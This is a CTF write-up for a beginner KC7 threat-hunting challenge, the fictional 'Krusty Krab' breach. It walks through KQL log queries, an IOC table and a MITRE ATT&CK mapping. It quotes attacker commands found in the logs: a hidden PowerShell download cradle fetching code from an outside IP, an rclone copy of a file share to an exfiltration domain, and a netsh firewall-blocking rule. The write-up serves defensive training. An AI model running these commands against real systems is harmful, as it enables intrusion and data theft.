# Krusty Krab

A beginner-friendly CTF challenge focused on threat hunting, log analysis, and cyber investigation using KQL (Kusto Query Language) to defend a fast food chain from cyber attacks.

![Difficulty](hxxps://img.shields[.]io/badge/Difficulty-Beginner-green?style=flat-square) ![Platform](hxxps://img.shields[.]io/badge/Platform-KC7-blue?style=flat-square) ![Category](hxxps://img.shields[.]io/badge/Category-Threat%20Hunting%20%2F%20DFIR-purple?style=flat-square)

---

## Challenge Overview

| **Attribute**       | **Details**                                                                 |
|---------------------|-----------------------------------------------------------------------------|
| **Challenge Name**  | Krusty Krab: An Intro to Pivoting and Analysis                             |
| **Author**          | David Brown                                                                 |
| **Platform**        | KC7 (kc7001.eastus)                                                         |
| **Category**        | Threat Hunting / DFIR / Log Analysis                                        |
| **Difficulty**      | Beginner                                                                    |
| **Tools Used**      | Azure Data Explorer (KQL), VirusTotal, Passive DNS                          |
| **Target/Box**      | KrustyKrab corporate environment                                            |

**Scenario:**

Participants defend the "Krusty Krab" fast food chain in the Bikini Bottom metropolitan area from malicious cyber actors attempting to steal the secret formula. A competitor, "Chum Bucket," is suspected of orchestrating cyberattacks to infiltrate the organization. Using Kusto Query Language (KQL) in Azure Data Explorer, analysts investigate a multi-stage attack involving phishing campaigns, credential compromise, malware deployment, and data exfiltration.

---

## Attack Timeline

| **Date/Time**            | **Event**                                                                               |
|--------------------------|-----------------------------------------------------------------------------------------|
| 2023-03-01T02:32:14Z     | Phishing emails sent to 4 employees with subject "Krabby Patty Worm Detected"          |
| 2023-03-01T08:20:02Z     | First employee clicked malicious link to scarynight[.]net                               |
| 2023-03-02T02:17:32Z     | Failed login attempt to Zenaida Warren's account from 54.17.157[.]246                  |
| 2023-03-02T04:01:55Z     | Successful login to Julie Hong's account from 50.6.66[.]245                             |
| 2023-03-02T08:49:23Z     | Brad Kasky clicked nightshift[.]com phishing link                                       |
| 2023-03-02T08:57:36Z     | Data exfiltration from Julie Hong's mailbox (important.rar downloaded)                  |
| 2023-03-08T04:38:05Z     | Luther Shearer's account compromised from 54.17.157[.]246                               |
| 2023-03-16T04:43:38Z     | Robert Vinson received phishing email with Free_Money.pdf link                          |
| 2023-03-16T10:55:51Z     | Robert Vinson clicked malicious link to burgers-formula[.]biz                           |
| 2023-03-17T07:53:14Z     | PowerShell data staging command executed on 7EJH-LAPTOP                                 |
| 2023-03-17T07:53:53Z     | Firewall rule added to block outgoing traffic on 7EJH-LAPTOP                            |
| 2023-03-17T07:54:22Z     | Data exfiltration via rclone to computer-wifesecret[.]com                               |
| 2023-03-20T04:37:37Z     | Christine Anderson targeted with email containing Jellyfish_Guide.pptx link             |
| 2023-03-20T08:38:47Z     | Christine Anderson downloaded Jellyfish_Guide.pptx dropper                              |
| 2023-03-20T08:44:20Z     | Jellyfish_Guide.pptx created on 13 employee machines                                    |
| 2023-03-28T05:36:12Z     | Timothy Graham received phishing email with holographic meatloaf lure                   |
| 2023-03-28T08:43:23Z     | Timothy Graham clicked chumsecret[.]biz link                                            |
| 2023-03-28T08:44:58Z     | krabbypatty[.]exe malware deployed to C:\SecretFormular\                                  |
| 2023-03-28T09:23:34Z     | PowerShell download cradle executed, contacting 59.240.32[.]173                         |

---

## Solution Walkthrough

### Step 1 — Initial Reconnaissance and Employee Identification

Understanding the data sources available and identifying the scope of the investigation.

```kql
// Query all available tables
Employees | take 10
Email | take 10
ProcessEvents | take 10
FileCreationEvents | take 10
OutboundNetworkEvents | take 10
InboundNetworkEvents | take 10
PassiveDns | take 10
AuthenticationEvents | take 10
SecurityAlerts | take 10

// Result: Identified 675 employees in the organization
Employees | count
// Result: 675
```

**Key findings:**
- **Employee count:** 675
- **Data sources:** Logs cover email, process execution, file creation, network traffic, authentication, and passive DNS

### Step 2 — Phishing Campaign Analysis

Investigated suspicious emails sent to employees with external tags and malicious links.

```kql
// Find emails sent to Christine Anderson
Email
| where recipient == "christine_anderson@krustykrab.com"
| where subject contains "external"

// Result: Email from legal.human_resources@yandex[.]com with subject "[EXTERNAL] Attention Krusty Krab employees: Your future is in danger!"

// Identify other recipients targeted by this sender
Email
| where sender == "legal.human_resources@yandex.com"
| distinct recipient

// Result: 12 employees targeted

// Analyze phishing email with "Krabby Patty Worm Detected" subject
Email
| where subject contains "[EXTERNAL] RE: Krabby Patty Worm Detected"
| where sender == "nosferatu.hash@hotmail.com"

// Result: 4 employees received phishing emails from nosferatu.hash@hotmail[.]com
```

**Key findings:**
- **Phishing sender:** nosferatu.hash@hotmail[.]com, legal.human_resources@yandex[.]com
- **Malicious domain:** scarynight[.]net
- **Targeted employees:** 12 via yandex campaign, 4 via nosferatu campaign
- **Subject line:** "[EXTERNAL] RE: Krabby Patty Worm Detected"

### Step 3 — Network Traffic Correlation

Tracked which employees clicked malicious links by correlating email data with outbound network events.

```kql
// Find who clicked links to scarynight.net
let scarynight_clicks = 
    OutboundNetworkEvents
    | where url contains "scarynight"
    | project timestamp, src_ip, url
    | sort by timestamp asc;
scarynight_clicks

// Result: First click at 2023-03-01T08:20:02Z from 192.168.1[.]243

// Identify user at this IP
Employees
| where ip_addr == "192.168.1.243"

// Result: Toni Jones (toni_jones@krustykrab[.]com)

// Find Julie Hong's activity after phishing email
let Julie_ips = 
    Employees
    | where name contains "Julie hong"
    | distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (Julie_ips)
| where url contains "scarynight"
| project timestamp, url, src_ip

// Result: Julie Hong clicked link at 2023-03-01T09:36:22Z from 192.168.2[.]64
```

**Key findings:**
- **First victim:** Toni Jones (192.168.1[.]243) clicked at 2023-03-01T08:20:02Z
- **Second victim:** Julie Hong (192.168.2[.]64) clicked at 2023-03-01T09:36:22Z
- **Malicious URL:** hxxps://scarynight[.]net/public/images/signin

### Step 4 — Credential Compromise Investigation

Analyzed authentication logs to identify compromised accounts and attacker infrastructure.

```kql
// Investigate login attempts from malicious IP
AuthenticationEvents
| where src_ip == "54.17.157.246"

// Result: 3 login attempts (1 successful, 2 failed)
// Successful: juhong (Julie Hong) at 2023-03-02T04:01:55Z
// Failed: zewarren (Zenaida Warren) at 2023-03-02T02:17:32Z, flholliday at 2023-03-14T03:21:30Z

// Find all accounts accessed from credential harvesting IP
AuthenticationEvents
| where src_ip == "50.6.66.245"
| distinct username

// Result: 3 users (juhong, maharber, flholliday)

// Identify when Marie Harber's account was compromised
AuthenticationEvents
| where username == "maharber"
| where src_ip == "50.6.66.245"

// Result: Failed login at 2023-03-03T03:43:49Z
// Password hash captured: 72d8b323934bfb61b4620fe681c0102f
```

**Key findings:**
- **Compromised accounts:** Julie Hong (successful), Marie Harber (attempted), Florence Holliday (attempted), Zenaida Warren (attempted)
- **Attacker IPs:** 54.17.157[.]246, 50.6.66[.]245
- **Credential harvesting:** Attackers captured password hashes during login attempts

### Step 5 — Malware Analysis and Dropper Investigation

Investigated malicious file drops following phishing link clicks.

```kql
// Find Jellyfish_Guide.pptx file creation events
FileCreationEvents
| where filename == "Jellyfish_Guide.pptx"
| project timestamp, hostname, username, path, sha256

// Result: 13 machines infected between 2023-03-20 and 2023-03-30
// SHA256: 4a64ffb707020fc077bb3c1f25c8cba5c0bb024679a82325baaab3374706b44e

// Investigate Christine Anderson's machine for secondary payload
let sus_file = 
    FileCreationEvents
    | where hostname == "XY14-LAPTOP"
    | where filename == "Jellyfish_Guide.pptx"
    | project timestamp;
FileCreationEvents
| where hostname == "XY14-LAPTOP"
| where timestamp >= toscalar(sus_file)

// Result: krabbypatty.exe created at C:\ProgramData\PSTkrabbypattty.exe
// SHA256: e3970346ff7fcc3665f027d7f221968087f3c42705f5799fbc1d2811ab1ca4ea
```

**Key findings:**
- **Dropper file:** Jellyfish_Guide.pptx (SHA256: 4a64ffb707020fc077bb3c1f25c8cba5c0bb024679a82325baaab3374706b44e)
- **Secondary payload:** krabbypatty[.]exe (SHA256: e3970346ff7fcc3665f027d7f221968087f3c42705f5799fbc1d2811ab1ca4ea)
- **Infected machines:** 13 hosts
- **VirusTotal analysis:** File uploaded as CX3VBWML.dll (EICAR test file - 43/65 detections)

### Step 6 — Command and Control Communications

Analyzed process execution to identify C2 beaconing behavior.

```kql
// Find PowerShell download cradle from krabbypatty.exe
ProcessEvents
| where hostname == "9IGB-DESKTOP"
| where parent_process_name contains "Krabby"
| where process_commandline contains "powershell"

// Result: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://59.240.32[.]173/a'))"

// Identify most prevalent C2 IP across all infected systems
ProcessEvents
| where parent_process_name contains "Krabby"
| where process_commandline contains "powershell"
| summarize count() by process_commandline
| sort by count_ desc

// Result: 157.99.160[.]12 was the most prevalent C2 IP (28 infected hosts)
```

**Key findings:**
- **C2 IP addresses:** 59.240.32[.]173, 157.99.160[.]12
- **Technique:** Fileless PowerShell download cradle using IEX and net.webclient
- **Infected hosts:** 28 machines executed similar PowerShell commands

### Step 7 — Data Exfiltration Detection

Investigated data theft via stolen credentials and rclone abuse.

```kql
// Find data exfiltration from Julie Hong's mailbox
InboundNetworkEvents
| where src_ip == "50.6.66.245"
| where url contains "juhong"

// Result: GET request to download important.rar from Deleted Mail folder at 2023-03-02T08:57:36Z

// Detect rclone usage for bulk data theft
ProcessEvents
| where process_commandline contains "rclone"
| where process_commandline contains "krustykrab"

// Result: rclone.exe copy --transfers 12 "\\krustykrab\shared\" computer-wifesecret[.]com
// Executed at 2023-03-17T07:54:22Z on 7EJH-LAPTOP
```

**Key findings:**
- **Exfiltration method 1:** Direct mailbox download (important.rar)
- **Exfiltration method 2:** Rclone bulk transfer to attacker cloud storage
- **Exfiltration domain:** computer-wifesecret[.]com
- **Stolen data source:** \\krustykrab\shared\ network share

### Step 8 — Defense Evasion Tactics

Identified attacker attempts to evade detection and block incident response.

```kql
// Find firewall manipulation commands
ProcessEvents
| where process_commandline contains "block outgoing traffic"
| distinct hostname

// Result: 8 machines had firewall rules added

// Identify first occurrence
ProcessEvents
| where process_commandline contains "block outgoing traffic"
| project timestamp, hostname, process_commandline
| sort by timestamp asc

// Result: First occurred on 7EJH-LAPTOP at 2023-03-17T07:53:53Z
// Command: cmd.exe /c netsh advfirewall firewall add rule name="Block Outgoing Traffic" dir=out action=block
```

**Key findings:**
- **Defense evasion:** Firewall rules added to block outgoing traffic
- **Affected systems:** 8 hosts
- **Timing:** Executed immediately before data exfiltration

### Step 9 — Passive DNS Infrastructure Mapping

Correlated malicious domains using passive DNS data to identify attacker infrastructure.

```kql
// Find IP resolution for scarynight.net
PassiveDns
| where domain contains "scarynight"

// Result: Domain resolved to multiple IPs including 198.174.181[.]37

// Enumerate all domains sharing same IP as burgers-formula.biz
let burgers_ip = 
    PassiveDns
    | where domain contains "burgers-formula.biz"
    | distinct ip;
PassiveDns
| where domain != "burgers-formula.biz"
| where ip in (burgers_ip)

// Result: 5 domains shared IP 213.173.220[.]223:
// eugene-secret[.]org, chumburgers[.]org, burgers-secret[.]us, computer-wife-burgers[.]us
```

**Key findings:**
- **C2 domains:** scarynight[.]net, nightshift[.]com, sleeve-dark[.]net, midnighttech[.]dev
- **Phishing domains:** burgers-formula[.]biz, eugene-secret[.]us, chumsecret[.]biz
- **Infrastructure overlap:** Multiple domains resolved to same attacker-controlled IPs
- **Key IP:** 213.173.220[.]223 hosted 5 related domains

### Step 10 — Attack Attribution and Summary

Linked attack components to identify comprehensive campaign scope.

```kql
// Find all emails from threat actor email addresses
let ta_emails = dynamic([
    "nosferatu.hash@hotmail.com",
    "nosferatu@gmail.com", 
    "slasher.graveyard@hotmail.com",
    "graveyard@hotmail.com",
    "legal.human_resources@yandex.com",
    "legal@gmail.com",
    "legal@verizon.com",
    "legal.vendor@protonmail.com"
]);
Email
| where sender has_any (ta_emails)
    or link has_any ("Free_Money.pdf", "Jellyfish_Guide.pptx")
| summarize count() by sender
| sort by count_ desc

// Result: slasher.graveyard@hotmail[.]com sent 10 emails (most active)
// legal.human_resources@yandex[.]com sent 12 emails
// Total campaign: 57 phishing emails sent
```

**Key findings:**
- **Primary threat actor:** Suspected "Chum Bucket" competitor
- **Attack infrastructure:** 8+ email addresses, 10+ malicious domains, 3+ C2 IPs
- **Total targets:** 57+ employees received phishing emails
- **Compromised accounts:** At least 5 confirmed
- **Data exfiltration:** Multiple incidents including mailbox theft and bulk file transfer

---

## IOC Table

| **Type**         | **Indicator**                                          | **Context**                                   | **Threat Actor**  |
|------------------|--------------------------------------------------------|-----------------------------------------------|-------------------|
| Email            | nosferatu.hash@hotmail[.]com                           | Phishing sender - Krabby Patty Worm lure      | Chum Bucket (suspected) |
| Email            | legal.human_resources@yandex[.]com                     | Phishing sender - HR impersonation            | Chum Bucket (suspected) |
| Email            | slasher.graveyard@hotmail[.]com                        | Most active phishing sender (10 emails)       | Chum Bucket (suspected) |
| Email            | legal@gmail[.]com                                      | Phishing sender - legal impersonation         | Chum Bucket (suspected) |
| Email            | legal.vendor@protonmail[.]com                          | Phishing sender - vendor impersonation        | Chum Bucket (suspected) |
| Domain           | scarynight[.]net                                       | Credential harvesting site                    | Chum Bucket (suspected) |
| Domain           | nightshift[.]com                                       | Phishing link destination                     | Chum Bucket (suspected) |
| Domain           | sleeve-dark[.]net                                      | Phishing link destination                     | Chum Bucket (suspected) |
| Domain           | midnighttech[.]dev                                     | Uncommon TLD used for phishing                | Chum Bucket (suspected) |
| Domain           | burgers-formula[.]biz                                  | Phishing infrastructure                       | Chum Bucket (suspected) |
| Domain           | eugene-secret[.]us                                     | Malware hosting                               | Chum Bucket (suspected) |
| Domain           | chumsecret[.]biz                                       | Malware hosting                               | Chum Bucket (suspected) |
| Domain           | computer-wifesecret[.]com                              | Data exfiltration destination                 | Chum Bucket (suspected) |
| Domain           | computer-wife-formula[.]net                            | C2 domain                                     | Chum Bucket (suspected) |
| IPv4             | 54.17.157[.]246                                        | Credential harvesting IP                      | Chum Bucket (suspected) |
| IPv4             | 50.6.66[.]245                                          | Authentication attempts/data theft            | Chum Bucket (suspected) |
| IPv4             | 136.61.241[.]165                                       | Reconnaissance and mailbox access             | Chum Bucket (suspected) |
| IPv4             | 59.240.32[.]173                                        | C2 beacon IP                                  | Chum Bucket (suspected) |
| IPv4             | 157.99.160[.]12                                        | Most prevalent C2 IP (28 infections)          | Chum Bucket (suspected) |
| IPv4             | 213.173.220[.]223                                      | Shared hosting for 5 phishing domains         | Chum Bucket (suspected) |
| SHA256           | 4a64ffb707020fc077bb3c1f25c8cba5c0bb024679a82325baaab3374706b44e | Jellyfish_Guide.pptx dropper                  | Chum Bucket (suspected) |
| SHA256           | e3970346ff7fcc3665f027d7f221968087f3c42705f5799fbc1d2811ab1ca4ea | krabbypatty[.]exe malware                       | Chum Bucket (suspected) |
| SHA256           | 974a5796a0e00057571f51e2092524af9da7971a2933c6b9b12293cf00c6cc00 | CX3VBWML.dll (EICAR test file)                | Training artifact |
| MD5              | 72d8b323934bfb61b4620fe681c0102f                       | Password hash captured during failed login    | Chum Bucket (suspected) |
| File             | Free_Money.pdf                                         | Phishing lure attachment                      | Chum Bucket (suspected) |
| File             | Jellyfish_Guide.pptx                                   | Weaponized Office document dropper            | Chum Bucket (suspected) |
| File             | important.rar                                          | Exfiltrated mailbox data                      | Stolen data |
| File             | important[.]zip                                          | Exfiltrated mailbox data                      | Stolen data |
| File             | email.7z                                               | Exfiltrated mailbox data                      | Stolen data |
| Path             | C:\ProgramData\PSTkrabbypattty[.]exe                     | Malware installation path                     | Chum Bucket (suspected) |
| Path             | C:\SecretFormular\krabbypatty[.]exe                      | Malware installation path                     | Chum Bucket (suspected) |
| Command          | powershell[.]exe -nop -w hidden -c "IEX..."              | Fileless download cradle                      | Chum Bucket (suspected) |
| Command          | rclone[.]exe copy --transfers 12 "\\krustykrab\shared\"  | Data exfiltration command                     | Chum Bucket (suspected) |
| Command          | netsh advfirewall firewall add rule name="Block Outgoing Traffic" | Defense evasion                               | Chum Bucket (suspected) |

---

## MITRE ATT&CK Mapping

| **Tactic**                | **Technique ID** | **Technique Name**                              | **Evidence from Investigation**                                                                 |
|---------------------------|------------------|-------------------------------------------------|-------------------------------------------------------------------------------------------------|
| Reconnaissance            | T1589.002        | Gather Victim Identity Information: Email Addresses | Threat actors gathered employee email addresses to target phishing campaigns                    |
| Resource Development      | T1583.001        | Acquire Infrastructure: Domains                 | Multiple malicious domains registered (scarynight[.]net, nightshift[.]com, burgers-formula[.]biz) |
| Initial Access            | T1566.002        | Phishing: Spearphishing Link                    | 57+ phishing emails sent with malicious links to credential harvesting sites                    |
| Initial Access            | T1566.001        | Phishing: Spearphishing Attachment              | Jellyfish_Guide.pptx weaponized document delivered via phishing                                 |
| Execution                 | T1204.001        | User Execution: Malicious Link                  | Multiple employees clicked phishing links leading to malware downloads                          |
| Execution                 | T1204.002        | User Execution: Malicious File                  | Employees opened Jellyfish_Guide.pptx dropper file                                              |
| Execution                 | T1059.001        | Command and Scripting Interpreter: PowerShell   | PowerShell download cradle: `IEX ((new-object net.webclient).downloadstring())`                 |
| Persistence               | T1547.001        | Boot or Logon Autostart Execution: Registry Run Keys | krabbypatty[.]exe installed to auto-start locations                                               |
| Defense Evasion           | T1562.004        | Impair Defenses: Disable or Modify System Firewall | Firewall rules added to block outgoing traffic on 8 hosts                                       |
| Defense Evasion           | T1027            | Obfuscated Files or Information                 | PowerShell command obfuscation with -nop, -w hidden flags                                       |
| Defense Evasion           | T1140            | Deobfuscate/Decode Files or Information         | IEX used to execute downloaded payload in memory                                                |
| Credential Access         | T1056.001        | Input Capture: Keylogging                       | Credential harvesting via fake login pages at scarynight[.]net                                  |
| Credential Access         | T1555            | Credentials from Password Stores                | Password hashes captured during authentication attempts (72d8b323934bfb61b4620fe681c0102f)      |
| Discovery                 | T1083            | File and Directory Discovery                    | PowerShell Get-ChildItem searching for *.docx, *.xlsx, *.pdf, *.pptx                            |
| Discovery                 | T1087.002        | Account Discovery: Domain Account               | Enumeration of employee accounts via authentication logs                                        |
| Collection                | T1074.001        | Data Staged: Local System                       | Files copied to staging directory before exfiltration: `\\attacker\exfil\`                      |
| Collection                | T1114.002        | Email Collection: Remote Email Collection       | Mailbox access and download of deleted mail folders                                             |
| Command and Control       | T1071.001        | Application Layer Protocol: Web Protocols       | HTTPS C2 communication to 59.240.32[.]173, 157.99.160[.]12                                      |
| Command and Control       | T1568.002        | Dynamic Resolution: Domain Generation Algorithms | Multiple C2 domains used (nightshift[.]net, computer-wife-formula[.]net)                        |
| Exfiltration              | T1041            | Exfiltration Over C2 Channel                    | Data uploaded to C2 infrastructure via PowerShell                                               |
| Exfiltration              | T1567.002        | Exfiltration Over Web Service: Exfiltration to Cloud Storage | rclone used to exfiltrate \\krustykrab\shared\ to computer-wifesecret[.]com                    |
| Exfiltration              | T1048.003        | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | HTTP GET requests to download compressed archives (important.rar, email.7z)                     |
| Impact                    | T1499.004        | Endpoint Denial of Service: Application or System Exploitation | Firewall rules blocking outgoing traffic impaired business operations                           |

---

## Tools Used

- **Azure Data Explorer (Kusto Query Language)** — Primary investigation platform for querying log data across email, process, file, network, and authentication events
- **VirusTotal** — Malware analysis and hash reputation checking (CX3VBWML.dll analysis)
- **Passive DNS** — Infrastructure correlation to identify related domains sharing attacker IPs
- **KQL Operators** — `where`, `project`, `distinct`, `summarize`, `sort`, `join`, `let` for advanced log correlation
- **rclone** — Legitimate cloud sync tool abused by attackers for bulk data exfiltration

---

## Key Takeaways

1. **Email Gateway Detection Gaps** — Despite multiple emails marked as "SUSPICIOUS," many still reached user inboxes and resulted in successful phishing. Organizations should implement stricter email filtering policies and quarantine external emails with suspicious indicators (mismatched reply-to addresses, newly registered domains).

2. **User Security Awareness Critical** — Multiple employees clicked phishing links despite [EXTERNAL] tags and suspicious subject lines. Regular phishing simulation training and user education on identifying social engineering tactics (urgency, impersonation, too-good-to-be-true offers) are essential.

3. **Pivoting Through Log Data** — The investigation demonstrated the power of log correlation: starting from a single phishing email, analysts pivoted through IP addresses, usernames, file hashes, and DNS records to uncover a multi-stage attack campaign affecting dozens of users. Centralized logging and robust query capabilities are foundational for effective incident response.

4. **Living Off the Land Abuse** — Attackers used legitimate tools (PowerShell, rclone, netsh) to evade detection. Behavioral analytics and command-line auditing are necessary to detect abuse of built-in utilities. Monitor for suspicious PowerShell execution patterns, especially `-nop`, `-w hidden`, and `IEX` usage.

5. **Defense Evasion Indicators** — The addition of firewall rules to block outgoing traffic immediately before exfiltration is a strong indicator of malicious intent. Alerting on unauthorized firewall modifications, especially those restricting outbound connections, can provide early warning of active attacks.

6. **Passive DNS for Infrastructure Mapping** — Passive DNS analysis revealed that multiple phishing and C2 domains shared common IP addresses, enabling infrastructure attribution. Organizations should leverage threat intelligence feeds and passive DNS data to proactively block related malicious infrastructure.

---

## References

- [MITRE ATT&CK T1566 - Phishing](https://attack.mitre.org/techniques/T1566/)
- [MITRE ATT&CK T1059.001 - PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK T1567.002 - Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/)
- [MITRE ATT&CK T1562.004 - Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004/)
- [KC7 Cyber Training Platform](hxxps://kc7cyber[.]com/)
- [Azure Data Explorer (KQL) Documentation](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/)
- [VirusTotal](https://www.virustotal.com/)
- [rclone Official Documentation](hxxps://rclone[.]org/)

---

*Author: David Brown | Platform: KC7 (kc7001.eastus) | Date: 2023*